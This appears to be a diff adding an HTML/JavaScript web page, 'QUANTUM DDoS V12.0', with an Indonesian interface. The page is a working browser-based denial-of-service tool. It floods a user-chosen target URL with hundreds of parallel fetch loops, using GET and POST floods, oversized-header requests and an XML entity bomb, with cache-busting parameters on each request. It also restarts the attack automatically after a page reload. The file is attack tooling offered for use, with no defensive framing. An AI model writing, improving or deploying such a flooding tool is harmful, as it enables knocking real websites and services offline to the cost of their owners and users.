@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ QUANTUM DDoS V12.0 - PERSISTENT ⚡</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background-image: radial-gradient(circle at 10px 10px, #0f0 1px, transparent 1px);
+            background-size: 50px 50px;
+        }
+        
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: #111;
+            border: 3px solid #0f0;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 0 50px #0f0;
+        }
+        
+        h1 {
+            text-align: center;
+            color: #0f0;
+            margin-bottom: 10px;
+            font-size: 24px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+
+        .user-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 10px;
+            background: #222;
+            border: 1px solid #0f0;
+            border-radius: 10px;
+            font-size: 14px;
+        }
+
+        .logout-btn {
+            background: #f00;
+            color: #fff;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+
+        .logout-btn:hover {
+            background: #c00;
+        }
+        
+        .warning {
+            background: #330;
+            border: 1px solid #ff0;
+            color: #ff0;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-size: 12px;
+        }
+        
+        .input-group {
+            margin: 15px 0;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #0f0;
+            font-size: 14px;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px;
+            background: #222;
+            border: 2px solid #0f0;
+            color: #0f0;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: #ff0;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .stat-box {
+            background: #222;
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            padding: 10px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 20px;
+            font-weight: bold;
+            color: #0f0;
+        }
+        
+        .stat-label {
+            font-size: 10px;
+            color: #888;
+        }
+        
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #0f0;
+            color: #000;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: 0.3s;
+        }
+        
+        button:hover {
+            background: #0c0;
+            transform: scale(1.02);
+            box-shadow: 0 0 30px #0f0;
+        }
+        
+        button.stop {
+            background: #f00;
+            color: white;
+        }
+        
+        button.stop:hover {
+            background: #c00;
+            box-shadow: 0 0 30px #f00;
+        }
+        
+        .log {
+            background: #222;
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 20px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+        
+        .log-entry {
+            color: #0f0;
+            margin: 3px 0;
+            border-bottom: 1px solid #333;
+            padding: 3px 0;
+        }
+        
+        .log-error {
+            color: #f00;
+        }
+        
+        .log-success {
+            color: #ff0;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #666;
+            font-size: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚡ QUANTUM DDoS V12.0 ⚡</h1>
+        
+        <div class="user-info" id="userInfo">
+            <span id="usernameDisplay">Loading...</span>
+            <button class="logout-btn" onclick="logout()">LOGOUT</button>
+        </div>
+        
+        <div class="warning" id="persistWarning" style="display: none;">
+            ⚠️ SERANGAN SEBELUMNYA TERDETEKSI! MELANJUTKAN OTOMATIS...
+        </div>
+        
+        <div class="input-group">
+            <label>🎯 Target URL:</label>
+            <input type="url" id="targetUrl" placeholder="https://target.com" value="https://example.com">
+        </div>
+        
+        <div class="input-group">
+            <label>⚙️ Attack Method:</label>
+            <select id="attackMethod">
+                <option value="http">HTTP Flood (GET)</option>
+                <option value="https">HTTPS Flood</option>
+                <option value="post">POST Flood</option>
+                <option value="slow">Slowloris</option>
+                <option value="xml">XML Bomb</option>
+                <option value="json">JSON Flood</option>
+                <option value="websocket">WebSocket Flood</option>
+                <option value="multipart">Multipart Flood</option>
+            </select>
+        </div>
+        
+        <div class="input-group">
+            <label>📊 Threads (Koneksi Paralel):</label>
+            <input type="number" id="threads" min="1" max="10000" value="100">
+        </div>
+        
+        <div class="input-group">
+            <label>⏱️ Delay (ms):</label>
+            <input type="number" id="delay" min="0" max="10000" value="10">
+        </div>
+        
+        <div class="stats">
+            <div class="stat-box">
+                <div class="stat-value" id="sentCount">0</div>
+                <div class="stat-label">PACKETS SENT</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="successCount">0</div>
+                <div class="stat-label">SUCCESS</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="failedCount">0</div>
+                <div class="stat-label">FAILED</div>
+            </div>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-box">
+                <div class="stat-value" id="bandwidth">0</div>
+                <div class="stat-label">MB SENT</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="speed">0</div>
+                <div class="stat-label">REQ/S</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="uptime">0s</div>
+                <div class="stat-label">UPTIME</div>
+            </div>
+        </div>
+        
+        <button id="startBtn" onclick="startAttack()">🚀 MULAI SERANGAN</button>
+        <button id="stopBtn" class="stop" onclick="stopAttack()" style="display: none;">⏹️ HENTIKAN SERANGAN</button>
+        
+        <div class="log" id="log"></div>
+        
+        <div class="footer">
+            ⚡ Quantum V12.0 - Persistent Mode - © SuikaRYP<br>
+            ⚠️ Serangan tetap jalan meskipun di reload!
+        </div>
+    </div>
+    
+    <script>
+        // ==================== CEK SESSION ====================
+        (function() {
+            const session = localStorage.getItem('quantum_session');
+            if (!session) {
+                window.location.href = 'login.html';
+                return;
+            }
+            const user = JSON.parse(session);
+            document.getElementById('usernameDisplay').innerText = `👤 ${user.username}`;
+        })();
+
+        function logout() {
+            localStorage.removeItem('quantum_session');
+            localStorage.removeItem('attack_state'); // Hapus juga state serangan
+            window.location.href = 'login.html';
+        }
+
+        // ==================== PERSISTENT ATTACK ENGINE ====================
+        let attackActive = false;
+        let sentCount = 0, successCount = 0, failedCount = 0, totalBytes = 0;
+        let workers = [];
+        let startTime = Date.now();
+        let updateInterval = null;
+
+        // Load state dari localStorage
+        function loadAttackState() {
+            const saved = localStorage.getItem('attack_state');
+            if (saved) {
+                try {
+                    const state = JSON.parse(saved);
+                    if (state.active) {
+                        document.getElementById('targetUrl').value = state.target || 'https://example.com';
+                        document.getElementById('attackMethod').value = state.method || 'http';
+                        document.getElementById('threads').value = state.threads || 100;
+                        document.getElementById('delay').value = state.delay || 10;
+                        document.getElementById('persistWarning').style.display = 'block';
+                        
+                        // Otomatis mulai serangan
+                        setTimeout(() => {
+                            startAttack(true); // true = dari persistence
+                        }, 500);
+                    }
+                } catch (e) {}
+            }
+        }
+
+        // Simpan state serangan
+        function saveAttackState() {
+            if (attackActive) {
+                const state = {
+                    active: true,
+                    target: document.getElementById('targetUrl').value,
+                    method: document.getElementById('attackMethod').value,
+                    threads: document.getElementById('threads').value,
+                    delay: document.getElementById('delay').value,
+                    timestamp: Date.now()
+                };
+                localStorage.setItem('attack_state', JSON.stringify(state));
+            } else {
+                localStorage.removeItem('attack_state');
+            }
+        }
+
+        // Logging
+        function log(message, type = 'info') {
+            const logDiv = document.getElementById('log');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            if (type === 'error') entry.className += ' log-error';
+            if (type === 'success') entry.className += ' log-success';
+            
+            const timestamp = new Date().toLocaleTimeString();
+            entry.innerHTML = `[${timestamp}] ${message}`;
+            
+            logDiv.appendChild(entry);
+            logDiv.scrollTop = logDiv.scrollHeight;
+            
+            if (logDiv.children.length > 100) {
+                logDiv.removeChild(logDiv.children[0]);
+            }
+        }
+
+        // Update statistik
+        function updateStats() {
+            document.getElementById('sentCount').textContent = sentCount.toLocaleString();
+            document.getElementById('successCount').textContent = successCount.toLocaleString();
+            document.getElementById('failedCount').textContent = failedCount.toLocaleString();
+            document.getElementById('bandwidth').textContent = (totalBytes / (1024 * 1024)).toFixed(2);
+            
+            const uptime = attackActive ? Math.floor((Date.now() - startTime) / 1000) : 0;
+            document.getElementById('uptime').textContent = uptime + 's';
+            
+            const speed = uptime > 0 ? Math.floor(sentCount / uptime) : 0;
+            document.getElementById('speed').textContent = speed;
+        }
+
+        // Kirim request (sama seperti sebelumnya)
+        async function sendRequest(target, method) {
+            if (!attackActive) return;
+            
+            try {
+                sentCount++;
+                
+                const randomParam = Math.random().toString(36).substring(7);
+                const url = target.includes('?') ? 
+                    `${target}&_=${randomParam}` : 
+                    `${target}?_=${randomParam}`;
+                
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 5000);
+                
+                let bytes = 0;
+                
+                switch(method) {
+                    case 'http':
+                    case 'https':
+                        await fetch(url, {
+                            method: 'GET',
+                            mode: 'no-cors',
+                            cache: 'no-store',
+                            signal: controller.signal,
+                            headers: {
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                                'Accept': '*/*',
+                                'Cache-Control': 'no-cache',
+                                'Pragma': 'no-cache'
+                            }
+                        });
+                        bytes = 1024;
+                        break;
+                        
+                    case 'post':
+                        await fetch(url, {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            cache: 'no-store',
+                            signal: controller.signal,
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            body: `data=${randomParam.repeat(1000)}`
+                        });
+                        bytes = 2048;
+                        break;
+                        
+                    case 'slow':
+                        await fetch(url, {
+                            method: 'GET',
+                            mode: 'no-cors',
+                            cache: 'no-store',
+                            signal: controller.signal,
+                            headers: {
+                                'User-Agent': 'Mozilla/5.0',
+                                'X-a': 'a'.repeat(10000)
+                            }
+                        });
+                        bytes = 10240;
+                        break;
+                        
+                    case 'xml':
+                        const xmlData = `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><root>&lol2;</root>`;
+                        await fetch(url, {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            cache: 'no-store',
+                            signal: controller.signal,
+                            headers: { 'Content-Type': 'application/xml' },
+                            body: xmlData
+                        });
+                        bytes = 102400;
+                        break;
+                        
+                    default:
+                        await fetch(url, { method: 'GET', mode: 'no-cors', cache: 'no-store', signal: controller.signal });
+                        bytes = 512;
+                }
+                
+                clearTimeout(timeoutId);
+                successCount++;
+                totalBytes += bytes;
+                
+                if (successCount % 100 === 0) {
+                    log(`✅ Success: ${successCount} requests`, 'success');
+                }
+                
+            } catch (error) {
+                failedCount++;
+                if (failedCount % 100 === 0) {
+                    log(`❌ Failed: ${error.message}`, 'error');
+                }
+            }
+            
+            updateStats();
+        }
+
+        // Worker task
+        async function workerTask(target, method, delay) {
+            while (attackActive) {
+                await sendRequest(target, method);
+                if (delay > 0) {
+                    await new Promise(resolve => setTimeout(resolve, delay));
+                }
+            }
+        }
+
+        // Mulai serangan
+        function startAttack(fromPersistence = false) {
+            const target = document.getElementById('targetUrl').value;
+            const method = document.getElementById('attackMethod').value;
+            const threads = parseInt(document.getElementById('threads').value);
+            const delay = parseInt(document.getElementById('delay').value);
+            
+            if (!target) {
+                log('❌ Masukin target dulu tolol!', 'error');
+                return;
+            }
+            
+            try {
+                new URL(target);
+            } catch {
+                log('❌ URL gak valid, kasih http:// atau https://', 'error');
+                return;
+            }
+            
+            if (attackActive) {
+                log('⚠️ Serangan udah jalan, berentiin dulu!', 'error');
+                return;
+            }
+            
+            attackActive = true;
+            sentCount = 0;
+            successCount = 0;
+            failedCount = 0;
+            totalBytes = 0;
+            startTime = Date.now();
+            
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('stopBtn').style.display = 'block';
+            
+            log(`🚀 MULAI SERANGAN ke ${target}`);
+            log(`📊 Method: ${method.toUpperCase()}, Threads: ${threads}, Delay: ${delay}ms`);
+            
+            // Simpan state
+            saveAttackState();
+            
+            // Start workers
+            for (let i = 0; i < threads; i++) {
+                workerTask(target, method, delay);
+            }
+            
+            // Update stats tiap 1 detik
+            if (updateInterval) clearInterval(updateInterval);
+            updateInterval = setInterval(() => {
+                if (!attackActive) {
+                    clearInterval(updateInterval);
+                }
+                updateStats();
+            }, 1000);
+        }
+
+        // Hentikan serangan
+        function stopAttack() {
+            attackActive = false;
+            workers = [];
+            
+            document.getElementById('startBtn').style.display = 'block';
+            document.getElementById('stopBtn').style.display = 'none';
+            
+            const duration = Math.floor((Date.now() - startTime) / 1000);
+            log(`⏹️ SERANGAN DIHENTIKAN setelah ${duration} detik`);
+            log(`📊 Total: ${sentCount} requests, ${(totalBytes/(1024*1024)).toFixed(2)} MB`);
+            
+            // Hapus state
+            saveAttackState();
+        }
+
+        // Load state saat halaman dimuat
+        window.onload = function() {
+            loadAttackState();
+        };
+
+        // Cegah klik kanan
+        document.addEventListener('contextmenu', e => e.preventDefault());
+    </script>
+</body>
+</html>
